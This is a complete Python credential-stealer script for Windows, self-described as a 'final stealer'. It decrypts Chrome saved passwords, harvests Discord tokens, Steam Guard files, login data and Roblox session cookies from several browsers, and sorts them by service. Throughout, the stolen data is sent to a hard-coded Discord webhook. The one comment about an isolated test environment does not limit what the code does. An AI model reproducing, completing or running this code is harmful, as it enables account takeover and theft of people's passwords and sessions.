
import os
import re
import sqlite3
import shutil
import json
import base64
import requests
import threading
import queue
import ctypes
import time
from ctypes import wintypes
from collections import defaultdict
from Crypto.Cipher import AES

# -------------------------------------------------------------------
#  CONFIGURATION
# -------------------------------------------------------------------
WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"   # 🔴 Replace only in isolated test environment

# -------------------------------------------------------------------
#  CHROME PASSWORD DECRYPTION (AES-GCM, works on Chrome 80+)
# -------------------------------------------------------------------
def get_chrome_master_key():
    """Extract and decrypt the AES master key from Chrome's Local State."""
    local_state = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    if not os.path.isfile(local_state):
        return None
    with open(local_state, 'r', encoding='utf-8') as f:
        data = json.load(f)
    encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])
    # Remove the 'DPAPI' prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    # Decrypt with DPAPI
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    pIn = DATA_BLOB()
    pIn.cbData = len(encrypted_key)
    pIn.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)),
                             ctypes.POINTER(ctypes.c_char))
    pOut = DATA_BLOB()
    if crypt32.CryptUnprotectData(ctypes.byref(pIn), None, None, None, None, 0, ctypes.byref(pOut)):
        master = ctypes.string_at(pOut.pbData, pOut.cbData)
        kernel32.LocalFree(pOut.pbData)
        return master
    return None

def decrypt_chrome_password(encrypted, master_key):
    """Decrypt a single Chrome v10/v11 password using AES-256-GCM."""
    if not encrypted.startswith(b'v10') and not encrypted.startswith(b'v11'):
        return None
    encrypted = encrypted[3:]          # remove 'v10' or 'v11' prefix
    nonce = encrypted[:12]
    ciphertext = encrypted[12:-16]
    tag = encrypted[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    try:
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

def get_chrome_passwords():
    """Return list of (url, username, decrypted_password)."""
    master = get_chrome_master_key()
    if not master:
        return []
    login_db = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
    if not os.path.isfile(login_db):
        return []
    temp_db = os.environ.get('TEMP', 'C:\\Windows\\Temp') + '\\login_temp.db'
    try:
        # Copy the database (may fail if Chrome is open – we just pass)
        shutil.copy2(login_db, temp_db)
    except:
        return []
    results = []
    try:
        conn = sqlite3.connect(temp_db)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted in cur.fetchall():
            if not encrypted:
                continue
            decrypted = decrypt_chrome_password(encrypted, master)
            if decrypted:
                results.append((url, username, decrypted))
        conn.close()
        os.remove(temp_db)
    except:
        pass
    return results

# -------------------------------------------------------------------
#  DISCORD TOKEN GRABBER (binary LevelDB scanning)
# -------------------------------------------------------------------
def get_discord_tokens():
    tokens = set()
    patterns = [rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', rb'mfa\.[\w-]{84}']
    temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
    # Discord desktop paths
    for base in [os.getenv('APPDATA'), os.getenv('LOCALAPPDATA')]:
        if not base:
            continue
        for variant in ['discord', 'discordcanary', 'discordptb', 'discorddevelopment']:
            leveldb = os.path.join(base, variant, 'Local Storage', 'leveldb')
            if not os.path.isdir(leveldb):
                continue
            for f in os.listdir(leveldb):
                if f.endswith(('.log', '.ldb')):
                    src = os.path.join(leveldb, f)
                    dst = os.path.join(temp_dir, f)
                    try:
                        shutil.copy2(src, dst)
                        with open(dst, 'rb') as fd:
                            data = fd.read()
                            for pat in patterns:
                                for match in re.findall(pat, data):
                                    tokens.add(match.decode('utf-8', errors='ignore'))
                        os.remove(dst)
                    except:
                        pass
    # Browser LevelDB (web Discord)
    for path in [os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
                 os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb')]:
        if os.path.isdir(path):
            for f in os.listdir(path):
                if f.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(path, f), 'rb') as fd:
                            data = fd.read()
                            for pat in patterns:
                                for match in re.findall(pat, data):
                                    tokens.add(match.decode('utf-8', errors='ignore'))
                    except:
                        pass
    return list(tokens) if tokens else ["✅ No Discord tokens found"]

# -------------------------------------------------------------------
#  STEAM DATA GRABBER (ssfn files truncated)
# -------------------------------------------------------------------
def get_steam_data():
    data = {}
    for sp in [r"%PROGRAMFILES%\Steam", r"%PROGRAMFILES(X86)%\Steam"]:
        sp = os.path.expandvars(sp)
        if not os.path.isdir(sp):
            continue
        # ssfn files (Steam Guard tokens)
        ssfn_files = [f for f in os.listdir(sp) if f.startswith("ssfn")]
        if ssfn_files:
            ssfn_dict = {}
            for f in ssfn_files:
                full = os.path.join(sp, f)
                try:
                    with open(full, 'rb') as fd:
                        hex_data = fd.read().hex()
                        if len(hex_data) > 100:
                            ssfn_dict[f] = f"Hex ({len(hex_data)//2} bytes): {hex_data[:100]}… (truncated)"
                        else:
                            ssfn_dict[f] = f"Hex: {hex_data}"
                except:
                    ssfn_dict[f] = "❌ Read error"
            data["Steam Guard files (ssfn)"] = ssfn_dict
        # loginusers.vdf
        vdf = os.path.join(sp, "config", "loginusers.vdf")
        if os.path.isfile(vdf):
            with open(vdf, 'r', errors='ignore') as fd:
                data["loginusers.vdf"] = fd.read()
    if not data:
        return {"Steam": ["✅ No Steam installation found"]}
    return {"Steam Data": [json.dumps(data, indent=2)]}

# -------------------------------------------------------------------
#  ROBLOX COOKIE GRABBER (multi‑browser + LevelDB)
# -------------------------------------------------------------------
def get_roblox_cookies():
    cookies = set()
    temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
    # Chromium browsers
    browsers = {
        'Chrome': r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies',
        'Edge': r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies',
        'Brave': r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies',
    }
    for name, path in browsers.items():
        path = os.path.expandvars(path)
        if not os.path.isfile(path):
            continue
        temp_db = os.path.join(temp_dir, f'{name}_cookies.db')
        try:
            shutil.copy2(path, temp_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute("SELECT value FROM cookies WHERE name = '.ROBLOSECURITY'")
            for row in cur.fetchall():
                if row[0]:
                    cookies.add(row[0])
            conn.close()
            os.remove(temp_db)
        except:
            pass
    # Firefox
    profiles = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
    if os.path.isdir(profiles):
        for profile in os.listdir(profiles):
            if profile.endswith(('.default-release', '.default')):
                db = os.path.join(profiles, profile, 'cookies.sqlite')
                if os.path.isfile(db):
                    temp_db = os.path.join(temp_dir, 'ff_cookies.db')
                    try:
                        shutil.copy2(db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cur = conn.cursor()
                        cur.execute("SELECT value FROM moz_cookies WHERE name = '.ROBLOSECURITY'")
                        for row in cur.fetchall():
                            if row[0]:
                                cookies.add(row[0])
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
    # LevelDB binary scan (fallback)
    leveldb_paths = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb')
    ]
    for path in leveldb_paths:
        if not os.path.isdir(path):
            continue
        for f in os.listdir(path):
            if f.endswith(('.log', '.ldb')):
                try:
                    with open(os.path.join(path, f), 'rb') as fd:
                        data = fd.read().decode('utf-8', errors='ignore')
                        match = re.search(r'\.ROBLOSECURITY[=:][A-Za-z0-9_\-\.]+', data)
                        if match:
                            cookie = match.group().split('=', 1)[1] if '=' in match.group() else match.group().split(':', 1)[1]
                            cookies.add(cookie)
                except:
                    pass
    return list(cookies) if cookies else ["✅ No Roblox cookies found"]

# -------------------------------------------------------------------
#  PASSWORDS WITH DEDUPLICATION (same (url,user,pass) only once)
# -------------------------------------------------------------------
# Priority categories for display order (popular services first)
PRIORITY_CATEGORIES = [
    "🌐 Google", "📘 Facebook", "🎮 Roblox", "💬 Discord", "🎮 Steam",
    "🐙 GitHub", "🪟 Microsoft", "📧 Outlook", "🔗 LinkedIn", "📦 Amazon",
    "💰 PayPal", "🎬 Netflix", "🎵 Spotify", "📺 Twitch", "🤖 Reddit",
    "📄 Other websites"
]

DOMAIN_TO_CATEGORY = {
    'google.com': '🌐 Google', 'gmail.com': '🌐 Google', 'accounts.google.com': '🌐 Google',
    'facebook.com': '📘 Facebook', 'roblox.com': '🎮 Roblox',
    'discord.com': '💬 Discord', 'steampowered.com': '🎮 Steam',
    'github.com': '🐙 GitHub', 'microsoft.com': '🪟 Microsoft',
    'outlook.com': '📧 Outlook', 'hotmail.com': '📧 Outlook', 'live.com': '📧 Outlook',
    'linkedin.com': '🔗 LinkedIn', 'amazon.com': '📦 Amazon',
    'paypal.com': '💰 PayPal', 'netflix.com': '🎬 Netflix',
    'spotify.com': '🎵 Spotify', 'twitch.tv': '📺 Twitch', 'reddit.com': '🤖 Reddit'
}

def get_passwords_deduplicated():
    """Return a dict with categories -> list of unique password entries."""
    raw = get_chrome_passwords()
    if not raw:
        return {"Passwords": ["No passwords found or decryption failed"]}

    # Use a set to deduplicate based on (url, username, password)
    unique_entries = set()
    for url, username, password in raw:
        unique_entries.add((url, username, password))

    # Organize into categories
    categories = defaultdict(set)
    for url, username, password in unique_entries:
        # Determine category
        category = "📄 Other websites"
        url_lower = url.lower()
        for domain, cat in DOMAIN_TO_CATEGORY.items():
            if domain in url_lower:
                category = cat
                break
        entry = f"🔗 {url}\n👤 {username}\n🔑 {password}"
        categories[category].add(entry)

    # Convert sets to lists and order categories by priority
    result = {}
    for cat in PRIORITY_CATEGORIES:
        if cat in categories:
            result[cat] = list(categories[cat])
    # Also add any leftover categories not in PRIORITY_CATEGORIES (should be none)
    for cat, entries in categories.items():
        if cat not in result:
            result[cat] = list(entries)
    return result

# -------------------------------------------------------------------
#  ASYNC DISCORD SENDER (with message splitting)
# -------------------------------------------------------------------
class AsyncSender:
    def __init__(self, webhook, max_workers=5):
        self.webhook = webhook
        self.q = queue.Queue()
        for _ in range(max_workers):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
    def _worker(self):
        while True:
            msg = self.q.get()
            if msg is None:
                break
            try:
                requests.post(self.webhook, json={"content": msg}, timeout=10)
            except:
                pass
            self.q.task_done()
    def send(self, msg):
        self.q.put(msg)
    def shutdown(self):
        for _ in range(5):
            self.q.put(None)
        self.q.join()

def send_section(sender, title, data_dict):
    """Helper to send a dictionary of categories (each category as separate message)."""
    for cat, entries in data_dict.items():
        if not entries:
            continue
        if isinstance(entries, list):
            msg = f"**{title} – {cat}**\n" + "\n".join(entries)
        else:
            msg = f"**{title} – {cat}**\n{entries}"
        # Split if too long (Discord 2000 limit)
        if len(msg) > 1900:
            for i in range(0, len(msg), 1900):
                sender.send(msg[i:i+1900])
        else:
            sender.send(msg)

# -------------------------------------------------------------------
#  MAIN ORCHESTRATOR (priority order: Discord → Steam → Roblox → Passwords)
# -------------------------------------------------------------------
def main():
    print("[*] Starting final stealer (priority order, dedup passwords)")
    # Collect data
    discord = get_discord_tokens()
    steam = get_steam_data()
    roblox = get_roblox_cookies()
    passwords = get_passwords_deduplicated()

    if WEBHOOK == "PASTE_YOUR_WEBHOOK_HERE":
        print("\n[DRY RUN] Data that would be sent (ordered):")
        print("1. Discord:", discord)
        print("2. Steam:", steam)
        print("3. Roblox:", roblox)
        print("4. Passwords:", passwords)
        return

    sender = AsyncSender(WEBHOOK)

    # 1. Discord
    send_section(sender, "🎫 Discord", {"Tokens": discord})
    # 2. Steam
    send_section(sender, "🎮 Steam", steam)
    # 3. Roblox
    send_section(sender, "🍪 Roblox", {"Cookies": roblox})
    # 4. Passwords (already categorized with priority order)
    send_section(sender, "🔑 Saved Passwords", passwords)

    sender.shutdown()
    print("[+] All data sent (priority order, duplicates removed).")

if __name__ == "__main__":
    main()